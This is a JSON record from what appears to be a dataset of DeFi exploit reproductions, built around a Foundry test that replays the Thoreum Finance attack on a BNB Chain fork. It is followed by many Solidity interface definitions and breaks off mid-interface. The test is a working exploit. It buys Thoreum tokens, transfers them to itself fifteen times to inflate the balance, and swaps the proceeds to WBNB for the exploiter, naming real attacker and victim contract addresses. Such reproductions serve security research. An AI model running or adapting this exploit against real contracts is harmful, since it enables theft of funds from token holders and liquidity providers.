                "link": "https://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/AnciliaInc/status/1615944396134043648",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/ThoreumFinance_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @KeyInfo - Total Lost : ~2000 BNB (6 BNB in this tx)\n// Attacker : 0x1ae2dc57399b2f4597366c5bf4fe39859c006f99\n// Attack Contract : 0x7d1e1901226e0ba389bfb1281ede859e6e48cc3d\n// Vulnerable Contract : 0xce1b3e5087e8215876af976032382dd338cf8401\n// @Info\n// @Analysis\n// Ancilia : https://twitter.com/AnciliaInc/status/1615944396134043648\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\nIPancakeRouter constant router = IPancakeRouter(payable(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8));\naddress constant  wbnb_addr  = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\naddress constant  thoreum_addr = 0xCE1b3e5087e8215876aF976032382dd338cF8401;\naddress constant  wbnb_thoreum_lp_addr = 0xd822E1737b1180F72368B2a9EB2de22805B67E34;\naddress constant  exploiter = 0x1285FE345523F00AB1A66ACD18d9E23D18D2e35c;\nIWBNB constant wbnb = IWBNB(payable(wbnb_addr));\nTHOREUMInterface constant THOREUM = THOREUMInterface(thoreum_addr);  \ncontract Attacker is Test{\n    //  forge test --contracts ./src/test/ThoreumFinance_exp.sol -vvv\n    function setUp() public {\n        cheat.label(address(router), \"router\");\n        cheat.label(thoreum_addr, \"thoreum\");\n        cheat.label(exploiter, \"exploiter\");\n        cheat.label(wbnb_addr, \"wbnb\");\n        cheat.label(wbnb_thoreum_lp_addr, \"wbnb_thoreum_lp\");\n        cheat.createSelectFork(\"bsc\", 24913171);\n    }\n    function testExploit() public{\n        Exploit exploit = new Exploit();\n        emit log_named_decimal_uint(\"[start] Attacker wbnb Balance\", wbnb.balanceOf(exploiter), 18);        \n        exploit.harvest();\n        emit log_named_decimal_uint(\"[End] Attacker wbnb Balance\",wbnb.balanceOf(exploiter), 18);        \n    }\n}\ncontract Exploit is Test{ \n   function  harvest()  public   { \n        //  step1: get some  thoreum token\n        vm.deal(address(this), 0.003 ether);\n        wbnb.deposit{value:0.003 ether}();\n        wbnb.approve(address(router),type(uint256).max);\n        address [] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(THOREUM);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(0.003 ether, 0, path, address(this), block.timestamp);\n        emit log_named_decimal_uint(\"[INFO] address(this) thoreum  balance : \", THOREUM.balanceOf(address(this)), 18);\n        //  step2: loop transfer function 15 times\n        for(uint i = 0; i < 15; i++){\n        THOREUM.transfer(address(this), THOREUM.balanceOf(address(this)));\n        emit log_named_decimal_uint(\"[INFO] address(this) thoreum  balance : \", THOREUM.balanceOf(address(this)), 18);\n        }\n        //step3: swap thoreum to wbnb\n        THOREUM.approve(address(router), type(uint256).max);\n        wbnb.approve(wbnb_thoreum_lp_addr, type(uint256).max);\n        address [] memory path2 = new address[](2);\n        path2[0] = address(THOREUM);\n        path2[1] = address(wbnb);\n        emit log_named_decimal_uint(\"[INFO] address(this) thoreum  balance : \", THOREUM.balanceOf(address(this)), 18);\n        while(THOREUM.balanceOf(address(this)) > 40000 ether){\n           emit log_named_decimal_uint(\"[INFO] address(exploiter) wbnb  balance : \", wbnb.balanceOf(exploiter), 18);\n          router.swapExactTokensForTokensSupportingFeeOnTransferTokens(40000 ether, 0, path2, exploiter, block.timestamp);\n        }\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(THOREUM.balanceOf(address(this)), 0, path2, exploiter, block.timestamp);\n   }\n    receive() external payable {}\n}\ninterface THOREUMInterface is IERC20{\n    function deposit() payable external;\n    function withdraw(uint256 wad) external; \n}",
                "token_count": 1130,
                "interfaces": [
                    {
                        "name": "THOREUMInterface",
                        "content": "interface THOREUMInterface is IERC20{\n    function deposit() payable external;\n    function withdraw(uint256 wad) external; \n}",
                        "token_count": 29,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "ICErc20Delegate",
                        "content": "interface ICErc20Delegate {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _addReserves(uint256 addAmount) external returns (uint256);\n\n  function _becomeImplementation(bytes memory data) external;\n\n  function _delegateCompLikeTo(address compLikeDelegatee) external;\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _resignImplementation() external;\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function initialize(\n    address underlying_,\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function initialize(\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral\n  ) external returns (uint256);\n\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function protocolSeizeShareMantissa() external view returns (uint256);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow(uint256 repayAmount) external returns (uint256);\n\n  function repayBorrowBehalf(address borrower, uint256 repayAmount)\n  external\n  returns (uint256);\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function sweepToken(address token) external;\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 1282,
                        "imported": true
                    },
                    {
                        "name": "ERC1820Registry",
                        "content": "interface ERC1820Registry {\n  function setInterfaceImplementer(\n    address _addr,\n    bytes32 _interfaceHash,\n    address _implementer\n  ) external;\n}\n",
                        "token_count": 36,
                        "imported": true
                    },
                    {
                        "name": "IUniswapV2Factory",
                        "content": "interface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n",
                        "token_count": 133,
                        "imported": true
                    },
                    {
                        "name": "IUniswapV2Pair",
                        "content": "interface IUniswapV2Pair {\n    function swap(\n      uint256 amount0Out,\n      uint256 amount1Out,\n      address to,\n      bytes calldata data\n    ) external;\n    function skim(address to) external;\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 140,
                        "imported": true
                    },
                    {
                        "name": "IBacon",
                        "content": "interface IBacon {\n  function lend(uint256 index) external;\n\n  function redeem(uint256 index) external;\n\n  function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 37,
                        "imported": true
                    },
                    {
                        "name": "IACOWriter",
                        "content": "interface IACOWriter {\n  function erc20proxy() external view returns (address);\n\n  function weth() external view returns (address);\n\n  function write(\n    address acoToken,\n    uint256 collateralAmount,\n    address exchangeAddress,\n    bytes memory exchangeData\n  ) external payable;\n\n  receive() external payable;\n}\n",
                        "token_count": 69,
                        "imported": true
                    },
                    {
                        "name": "IRevest",
                        "content": "interface IRevest {\n  struct FNFTConfig {\n    address asset;\n    address pipeToContract;\n    uint256 depositAmount;\n    uint256 depositMul;\n    uint256 split;\n    uint256 depositStopTime;\n    bool maturityExtension;\n    bool isMulti;\n    bool nontransferrable;\n  }\n\n  event FNFTAddionalDeposited(\n    address indexed from,\n    uint256 indexed newFNFTId,\n    uint256 indexed quantity,\n    uint256 amount\n  );\n  event FNFTAddressLockMinted(\n    address indexed asset,\n    address indexed from,\n    uint256 indexed fnftId,\n    address trigger,\n    uint256[] quantities,\n    FNFTConfig fnftConfig\n  );\n  event FNFTMaturityExtended(\n    address indexed from,\n    uint256 indexed fnftId,\n    uint256 indexed newExtendedTime\n  );\n  event FNFTSplit(\n    address indexed from,\n    uint256[] indexed newFNFTId,\n    uint256[] indexed proportions,\n    uint256 quantity\n  );\n  event FNFTTimeLockMinted(\n    address indexed asset,\n    address indexed from,\n    uint256 indexed fnftId,\n    uint256 endTime,\n    uint256[] quantities,\n    FNFTConfig fnftConfig\n  );\n  event FNFTUnlocked(address indexed from, uint256 indexed fnftId);\n  event FNFTValueLockMinted(\n    address indexed primaryAsset,\n    address indexed from,\n    uint256 indexed fnftId,\n    address compareTo,\n    address oracleDispatch,\n    uint256[] quantities,\n    FNFTConfig fnftConfig\n  );\n  event FNFTWithdrawn(\n    address indexed from,\n    uint256 indexed fnftId,\n    uint256 indexed quantity\n  );\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event RoleAdminChanged(\n    bytes32 indexed role,\n    bytes32 indexed previousAdminRole,\n    bytes32 indexed newAdminRole\n  );\n  event RoleGranted(\n    bytes32 indexed role,\n    address indexed account,\n    address indexed sender\n  );\n  event RoleRevoked(\n    bytes32 indexed role,\n    address indexed account,\n    address indexed sender\n  );\n\n  function ADDRESS_LOCK_INTERFACE_ID() external view returns (bytes4);\n\n  function DEFAULT_ADMIN_ROLE() external view returns (bytes32);\n\n  function PAUSER_ROLE() external view returns (bytes32);\n\n  function depositAdditionalToFNFT(\n    uint256 fnftId,\n    uint256 amount,\n    uint256 quantity\n  ) external returns (uint256);\n\n  function erc20Fee() external view returns (uint256);\n\n  function extendFNFTMaturity(uint256 fnftId, uint256 endTime)\n  external\n  returns (uint256);\n\n  function flatWeiFee() external view returns (uint256);\n\n  function getAddressesProvider() external view returns (address);\n\n  function getERC20Fee() external view returns (uint256);\n\n  function getFlatWeiFee() external view returns (uint256);\n\n  function getRoleAdmin(bytes32 role) external view returns (bytes32);\n\n  function getRoleMember(bytes32 role, uint256 index)\n  external\n  view\n  returns (address);\n\n  function getRoleMemberCount(bytes32 role) external view returns (uint256);\n\n  function grantRole(bytes32 role, address account) external;\n\n  function hasRole(bytes32 role, address account) external view returns (bool);\n\n  function mintAddressLock(\n    address trigger,\n    bytes memory arguments,\n    address[] memory recipients,\n    uint256[] memory quantities,\n    FNFTConfig memory fnftConfig\n  ) external payable returns (uint256);\n\n  function mintTimeLock(\n    uint256 endTime,\n    address[] memory recipients,\n    uint256[] memory quantities,\n    FNFTConfig memory fnftConfig\n  ) external payable returns (uint256);\n\n  function mintValueLock(\n    address primaryAsset,\n    address compareTo,\n    uint256 unlockValue,\n    bool unlockRisingEdge,\n    address oracleDispatch,\n    address[] memory recipients,\n    uint256[] memory quantities,\n    FNFTConfig memory fnftConfig\n  ) external payable returns (uint256);\n\n  function owner() external view returns (address);\n\n  function renounceOwnership() external;\n\n  function renounceRole(bytes32 role, address account) external;\n\n  function revokeRole(bytes32 role, address account) external;\n\n  function setAddressRegistry(address registry) external;\n\n  function setERC20Fee(uint256 erc20) external;\n\n  function setFlatWeiFee(uint256 wethFee) external;\n\n  function splitFNFT(\n    uint256 fnftId,\n    uint256[] memory proportions,\n    uint256 quantity\n  ) external returns (uint256[] memory);\n\n  function supportsInterface(bytes4 interfaceId) external view returns (bool);\n\n  function transferOwnership(address newOwner) external;\n\n  function unlockFNFT(uint256 fnftId) external;\n\n  function withdrawFNFT(uint256 fnftId, uint256 quantity) external;\n}\n",
                        "token_count": 1039,
                        "imported": true
                    },
                    {
                        "name": "AnyswapV4Router",
                        "content": "interface AnyswapV4Router {\n  function anySwapOutUnderlyingWithPermit(\n    address from,\n    address token,\n    address to,\n    uint256 amount,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s,\n    uint256 toChainID\n  ) external;\n}\n",
                        "token_count": 68,
                        "imported": true
                    },
                    {
                        "name": "WETH",
                        "content": "interface WETH {\n  function approve(address guy, uint256 wad) external returns (bool);\n\n  function withdraw(uint256 wad) external;\n\n  function balanceOf(address) external view returns (uint256);\n\n  function transfer(address dst, uint256 wad) external returns (bool);\n}\n",
                        "token_count": 60,
                        "imported": true
                    },
                    {
                        "name": "AnyswapV1ERC20",
                        "content": "interface AnyswapV1ERC20 {\n  function mint(address to, uint256 amount) external returns (bool);\n\n  function burn(address from, uint256 amount) external returns (bool);\n\n  function changeVault(address newVault) external returns (bool);\n\n  function depositVault(uint256 amount, address to) external returns (uint256);\n\n  function withdrawVault(\n    address from,\n    uint256 amount,\n    address to\n  ) external returns (uint256);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 106,
                        "imported": true
                    },
                    {
                        "name": "IERC1820Registry",
                        "content": "interface IERC1820Registry {\n  function setInterfaceImplementer(\n    address _addr,\n    bytes32 _interfaceHash,\n    address _implementer\n  ) external;\n\n  function getManager(address _addr) external view returns (address);\n\n  function setManager(address _addr, address _newManager) external;\n\n  function interfaceHash(string memory _interfaceName)\n  external\n  pure\n  returns (bytes32);\n\n  function updateERC165Cache(address _contract, bytes4 _interfaceId) external;\n\n  function getInterfaceImplementer(address _addr, bytes32 _interfaceHash)\n  external\n  view\n  returns (address);\n\n  function implementsERC165InterfaceNoCache(\n    address _contract,\n    bytes4 _interfaceId\n  ) external view returns (bool);\n\n  function implementsERC165Interface(address _contract, bytes4 _interfaceId)\n  external\n  view\n  returns (bool);\n\n  event InterfaceImplementerSet(\n    address indexed addr,\n    bytes32 indexed interfaceHash,\n    address indexed implementer\n  );\n  event ManagerChanged(address indexed addr, address indexed newManager);\n}\n",
                        "token_count": 229,
                        "imported": true
                    },
                    {
                        "name": "IERC777",
                        "content": "interface IERC777 {\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function granularity() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function send(\n    address recipient,\n    uint256 amount,\n    bytes calldata data\n  ) external;\n\n  function burn(uint256 amount, bytes calldata data) external;\n\n  function isOperatorFor(address operator, address tokenHolder)\n  external\n  view\n  returns (bool);\n\n  function authorizeOperator(address operator) external;\n\n  function revokeOperator(address operator) external;\n\n  function defaultOperators() external view returns (address[] memory);\n\n  function operatorSend(\n    address sender,\n    address recipient,\n    uint256 amount,\n    bytes calldata data,\n    bytes calldata operatorData\n  ) external;\n\n  function operatorBurn(\n    address account,\n    uint256 amount,\n    bytes calldata data,\n    bytes calldata operatorData\n  ) external;\n\n  event Sent(\n    address indexed operator,\n    address indexed from,\n    address indexed to,\n    uint256 amount,\n    bytes data,\n    bytes operatorData\n  );\n\n  event Minted(\n    address indexed operator,\n    address indexed to,\n    uint256 amount,\n    bytes data,\n    bytes operatorData\n  );\n\n  event Burned(\n    address indexed operator,\n    address indexed from,\n    uint256 amount,\n    bytes data,\n    bytes operatorData\n  );\n\n  event AuthorizedOperator(\n    address indexed operator,\n    address indexed tokenHolder\n  );\n\n  event RevokedOperator(address indexed operator, address indexed tokenHolder);\n}\n",
                        "token_count": 381,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V3",
                        "content": "interface Uni_Pair_V3 {\n  function token0() external view returns (address);\n  function token1() external view returns (address);\n  function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n  function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n",
                        "token_count": 111,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address 